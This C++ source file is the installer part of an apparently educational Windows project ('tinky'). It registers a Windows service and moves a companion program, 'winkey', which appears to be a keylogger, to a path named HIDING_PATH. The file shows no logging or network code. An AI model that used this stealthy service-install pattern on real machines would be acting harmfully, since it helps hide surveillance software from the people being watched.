#include "tinky.hpp"
#include <iostream>
#include "utils.hpp"

using namespace std;

extern tinky_t tinky;

static int openSCM(void) {
	tinky.HServiceControlManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE); // SC_MANAGER_ALL_ACCESS
	if (!tinky.HServiceControlManager) {
		wcerr << "Error while accessing Service Control Manager\n";
		return (FAILURE);
	}
	return (SUCCESS);
}

static int createService(void) {
	if (!openSCM())
		return (FAILURE);

	string servicePath = getServicePath(SVC_NAME);
	cout << "Service full path is: " << servicePath << '\n';
	tinky.HService = CreateServiceA(
		tinky.HServiceControlManager,
		SVC_NAME,
		SVC_NAME,
		SC_MANAGER_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL, // should log on error
		servicePath.c_str(), // TODO what is the final binary path + GetCurrentDirectory() ?
		NULL, // group order
		NULL, // lpLoadOrderGroup
		NULL, // dependencies
		NULL,
		NULL
	);
	if (!tinky.HService) {
		cerr << "CreateServiceA returned: " << tinky.HService << " (failure)" << '\n'; // Remove
		DWORD code = GetLastError();
		if (code == ERROR_SERVICE_EXISTS)
			wcerr << L"Service tinky already exist\n";
		return (FAILURE);
	}
	return (SUCCESS);
}

static void movWinkey(void) {
	string processPath = getServicePath("winkey");

	if (!MoveFileExA(
			processPath.c_str(), 
			HIDING_PATH, 
			MOVEFILE_REPLACE_EXISTING
		)) {
		cerr << "Failed to move: "<< (int)GetLastError() <<  "\n";
		/* Si winkey.exe nexiste pas, le service sinstalle quand meme
		 * et winkey nest pas a sa place...
		 */
	}
}

int install(void) {
	if (!createService())
		return (FAILURE);
	movWinkey();
	return (SUCCESS);
}